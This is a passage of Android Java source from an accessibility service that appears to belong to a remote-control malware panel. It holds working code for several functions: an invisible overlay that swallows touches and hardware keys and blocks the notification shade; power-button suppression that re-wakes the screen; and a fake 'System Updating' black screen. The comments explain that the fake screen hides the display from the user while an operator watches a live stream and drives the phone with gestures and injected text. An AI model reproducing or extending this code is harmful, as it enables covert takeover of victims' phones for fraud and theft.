                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_FULLSCREEN
                    | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                    | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED  // show above lock screen
                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON    // keep display on
                    | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON    // wake screen if off
                    | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD; // dismiss keyguard layer
            if (powerLockEnabled) {
                wFlags |= WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;
            }
            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                overlayType,
                wFlags,
                PixelFormat.TRANSLUCENT
            );
            lp.gravity = android.view.Gravity.TOP | android.view.Gravity.LEFT;
            lp.x = 0;
            lp.y = -300; // extend 300px ABOVE screen top to block pull-down quick settings
            // Android 9+: allow overlay to extend into display cutout (notch) area
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                lp.layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
            }

            blockOverlay = new View(this) {
                @Override public boolean onTouchEvent(MotionEvent ev) { return true; }
                @Override public boolean dispatchKeyEvent(KeyEvent event) {
                    int code = event.getKeyCode();
                    // Consume BACK, MENU, SEARCH, VOLUME, CAMERA — but NOT HOME (system reserved)
                    if (code == KeyEvent.KEYCODE_BACK
                            || code == KeyEvent.KEYCODE_MENU
                            || code == KeyEvent.KEYCODE_SEARCH
                            || code == KeyEvent.KEYCODE_VOLUME_DOWN
                            || code == KeyEvent.KEYCODE_VOLUME_UP
                            || code == KeyEvent.KEYCODE_VOLUME_MUTE
                            || code == KeyEvent.KEYCODE_APP_SWITCH
                            || code == KeyEvent.KEYCODE_CAMERA) {
                        return true; // consumed — system never sees it
                    }
                    return super.dispatchKeyEvent(event);
                }
            };
            blockOverlay.setAlpha(0f);
            blockOverlay.setFocusable(true);
            blockOverlay.setFocusableInTouchMode(true);
            wm.addView(blockOverlay, lp);
            blockOverlay.requestFocus();
            sBlockOverlay = blockOverlay;
            if (powerLockEnabled) registerScreenOffReceiver();
        } catch (Exception e) {
            blockOverlay = null;
            sBlockOverlay = null;
        }
    }

    private void doRemoveOverlay() {
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (blockOverlay != null) {
            try { wm.removeView(blockOverlay); } catch (Exception ignored) {}
            blockOverlay = null;
        }
        View sb = sBlockOverlay;
        if (sb != null) {
            try { wm.removeView(sb); } catch (Exception ignored) {}
            sBlockOverlay = null;
        }
        unregisterScreenOffReceiver();
    }

    /** Enable or disable power button suppression (works standalone or with block_input) */
    public void setPowerLock(boolean enabled) {
        mainHandler.post(() -> {
            powerLockEnabled = enabled;
            if (enabled) {
                registerScreenOffReceiver();
                // If overlay is active, update its flags to include KEEP_SCREEN_ON
                if (blockOverlay != null) {
                    try {
                        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                        WindowManager.LayoutParams lp =
                            (WindowManager.LayoutParams) blockOverlay.getLayoutParams();
                        lp.flags |= WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;
                        wm.updateViewLayout(blockOverlay, lp);
                    } catch (Exception ignored) {}
                }
            } else {
                unregisterScreenOffReceiver();
                if (powerWakeLock != null && powerWakeLock.isHeld()) powerWakeLock.release();
                powerWakeLock = null;
            }
        });
    }

    private void registerScreenOffReceiver() {
        if (screenOffReceiver != null) return;
        screenOffReceiver = new BroadcastReceiver() {
            @Override public void onReceive(Context context, Intent intent) {
                if (Intent.ACTION_SCREEN_OFF.equals(intent.getAction()) && powerLockEnabled) {
                    // Immediately wake the screen back on
                    mainHandler.postDelayed(() -> {
                        try {
                            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                            @SuppressWarnings("deprecation")
                            PowerManager.WakeLock wl = pm.newWakeLock(
                                PowerManager.FULL_WAKE_LOCK
                                    | PowerManager.ACQUIRE_CAUSES_WAKEUP
                                    | PowerManager.ON_AFTER_RELEASE,
                                "panellord:powerlock"
                            );
                            wl.acquire(3000);
                            powerWakeLock = wl;
                        } catch (Exception ignored) {}
                    }, 100);
                }
            }
        };
        try {
            registerReceiver(screenOffReceiver, new IntentFilter(Intent.ACTION_SCREEN_OFF));
        } catch (Exception ignored) {}
    }

    private void unregisterScreenOffReceiver() {
        if (screenOffReceiver == null) return;
        try { unregisterReceiver(screenOffReceiver); } catch (Exception ignored) {}
        screenOffReceiver = null;
    }

    /* ── Visual Black Screen Overlay (WindowManager — user can't dismiss) ──── */

    public void showBlackScreenOverlay(final String text) {
        blackScreenEnabled = true;
        lastBlackScreenText = (text != null && !text.isEmpty()) ? text : "System Updating";
        mainHandler.post(() -> {
            // Handle stale reference (e.g. dismissed by biometric/system dialog)
            if (visualBlackOverlay != null && !visualBlackOverlay.isAttachedToWindow()) {
                visualBlackOverlay = null;
                visualDotView = null;
            }
            if (visualBlackOverlay != null) return;
            try {
                WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);

                android.util.DisplayMetrics dm = new android.util.DisplayMetrics();
                wm.getDefaultDisplay().getRealMetrics(dm);
                int screenW = dm.widthPixels;
                int screenH = dm.heightPixels;

                int overlayType;
                if (android.os.Build.VERSION.SDK_INT >= 34) {
                    overlayType = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
                } else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O
                        && android.provider.Settings.canDrawOverlays(this)) {
                    overlayType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                } else {
                    overlayType = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
                }

                // ── HOW THIS WORKS ────────────────────────────────────────────────────
                //
                //  screenBrightness = 0.01f
                //    → Physical backlight drops to ~1% (near-off on any display).
                //      User can see almost nothing physically.
                //
                //  Background = 0x14000000  (8% opaque black = 92% transparent)
                //    → In the GPU framebuffer this adds only a tiny 8% black tint.
                //      MediaProjection reads the raw framebuffer — NOT the physical display.
                //      Panel sees: live underlying app at 92% quality  ✓
                //      User sees: 1% backlight × 92% underlying = 0.9% visible = pitch black ✓
                //
                //  FLAG_NOT_TOUCHABLE
                //    → User taps and operator dispatchGesture() both pass through to the
                //      real app. User cannot see their taps (screen is physically dark).
                //      Operator can control the live app and see the result in real-time. ✓
                //
                //  ScreenMirrorService stays UNPAUSED → continuous live stream to panel ✓
                // ──────────────────────────────────────────────────────────────────────

                WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                    screenW, screenH, overlayType,
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_FULLSCREEN
                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                        | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                        | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                        | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                    android.graphics.PixelFormat.TRANSLUCENT
                );
                lp.gravity          = android.view.Gravity.TOP | android.view.Gravity.LEFT;
                lp.x                = 0;
                lp.y                = 0;
                lp.screenBrightness = 0.01f;  // physical backlight ≈ 1% → user sees black

                android.widget.FrameLayout root = new android.widget.FrameLayout(this);
                // 8% opaque black — nearly invisible in framebuffer (panel sees 92% live screen)
                // but combined with 1% physical brightness the user sees absolutely nothing
                root.setBackgroundColor(0x14000000);
                root.setSystemUiVisibility(
                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    | android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                    | android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    | android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | android.view.View.SYSTEM_UI_FLAG_FULLSCREEN
                    | android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);

                // ── Centred text block (visible to user via AMOLED glow; panel sees live screen) ──
                String displayText = (text != null && !text.isEmpty()) ? text : "System Updating";
                android.widget.LinearLayout center = new android.widget.LinearLayout(this);
                center.setOrientation(android.widget.LinearLayout.VERTICAL);
                center.setGravity(android.view.Gravity.CENTER);

                // Spinner — pure white
                android.widget.ProgressBar spinner = new android.widget.ProgressBar(this);
                spinner.setIndeterminate(true);
                android.graphics.drawable.Drawable sd = spinner.getIndeterminateDrawable();
                if (sd != null) sd.setColorFilter(android.graphics.Color.WHITE,
                    android.graphics.PorterDuff.Mode.SRC_IN);
                android.widget.LinearLayout.LayoutParams spLp =
                    new android.widget.LinearLayout.LayoutParams(200, 200);
                spLp.gravity = android.view.Gravity.CENTER_HORIZONTAL;
                spLp.bottomMargin = 48;
                center.addView(spinner, spLp);

                // Main text (custom or "System Updating")
                android.widget.TextView tvMain = new android.widget.TextView(this);
                tvMain.setText(displayText);
                tvMain.setTextColor(android.graphics.Color.WHITE);
                tvMain.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 24f);
                tvMain.setGravity(android.view.Gravity.CENTER);
                tvMain.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
                android.widget.LinearLayout.LayoutParams tvLp =
                    new android.widget.LinearLayout.LayoutParams(
                        android.widget.LinearLayout.LayoutParams.WRAP_CONTENT,
                        android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
                tvLp.gravity = android.view.Gravity.CENTER_HORIZONTAL;
                center.addView(tvMain, tvLp);

                // Animated dots
                visualDotView = new android.widget.TextView(this);
                visualDotView.setText(".");
                visualDotView.setTextColor(android.graphics.Color.WHITE);
                visualDotView.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 28f);
                visualDotView.setGravity(android.view.Gravity.CENTER);
                android.widget.LinearLayout.LayoutParams dtLp =
                    new android.widget.LinearLayout.LayoutParams(
                        android.widget.LinearLayout.LayoutParams.WRAP_CONTENT,
                        android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
                dtLp.gravity = android.view.Gravity.CENTER_HORIZONTAL;
                dtLp.topMargin = 8;
                center.addView(visualDotView, dtLp);

                android.widget.FrameLayout.LayoutParams fp =
                    new android.widget.FrameLayout.LayoutParams(
                        android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                        android.widget.FrameLayout.LayoutParams.MATCH_PARENT);
                fp.gravity = android.view.Gravity.CENTER;
                root.addView(center, fp);

                // ScreenMirrorService keeps running — panel gets continuous live frames
                ScreenMirrorService.setPaused(false);

                wm.addView(root, lp);
                visualBlackOverlay = root;
                sVisualBlackOverlay = root;
                tickVisualDots();
            } catch (Exception e) {
                visualBlackOverlay = null;
                sVisualBlackOverlay = null;
            }
        });
    }

    private void tickVisualDots() {
        if (visualDotView == null || visualBlackOverlay == null) return;
        final String[] DOTS = {".", "..", "..."};
        visualDotView.setText(DOTS[visualDotState++ % 3]);
        mainHandler.postDelayed(this::tickVisualDots, 600);
    }

    public void dismissBlackScreenOverlay() {
        blackScreenEnabled = false;
        mainHandler.post(() -> {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            // Try instance reference
            android.widget.FrameLayout v = visualBlackOverlay;
            visualBlackOverlay = null;
            visualDotView = null;
            if (v != null) {
                try { wm.removeView(v); } catch (Exception ignored) {}
            }
            // Try static reference (survives service restart)
            android.widget.FrameLayout sv = sVisualBlackOverlay;
            sVisualBlackOverlay = null;
            if (sv != null && sv != v) {
                try { wm.removeView(sv); } catch (Exception ignored) {}
            }
            // Force brightness reset: add a full-screen overlay with screenBrightness=1.0
            // that overrides ANY stuck overlay, then remove it after 1 second
            try {
                WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    android.graphics.PixelFormat.TRANSLUCENT
                );
                lp.screenBrightness = 1.0f;
                View brightnessReset = new View(PanelAccessibility.this);
                brightnessReset.setBackgroundColor(0x00000000);
                wm.addView(brightnessReset, lp);
                mainHandler.postDelayed(() -> {
                    try { wm.removeView(brightnessReset); } catch (Exception ignored2) {}
                }, 1500);
            } catch (Exception ignored) {}
            ScreenMirrorService.setPaused(false);
        });
        // Also unblock input
        mainHandler.postDelayed(() -> unblockUserInput(), 100);
    }

    /* ── END Black Screen Overlay ──────────────────────────────────────────── */

    public void dispatchTextKey(String key) {
        try {
            android.view.accessibility.AccessibilityNodeInfo focused =
                findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT);
            if (focused == null) return;
            if (key.equals("DEL")) {
                android.os.Bundle args = new android.os.Bundle();
                CharSequence cur = focused.getText();
                String updated = cur != null && cur.length() > 0
                    ? cur.toString().substring(0, cur.length() - 1) : "";
                args.putCharSequence(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    updated);
                focused.performAction(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            } else if (key.equals("ENTER")) {
                focused.performAction(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_NEXT_AT_MOVEMENT_GRANULARITY);
            } else {
                android.os.Bundle args = new android.os.Bundle();
                CharSequence cur = focused.getText();
                String updated = (cur != null ? cur.toString() : "") + key;
                args.putCharSequence(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    updated);
                focused.performAction(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            }
            focused.recycle();
        } catch (Exception ignored) {}
    }
}
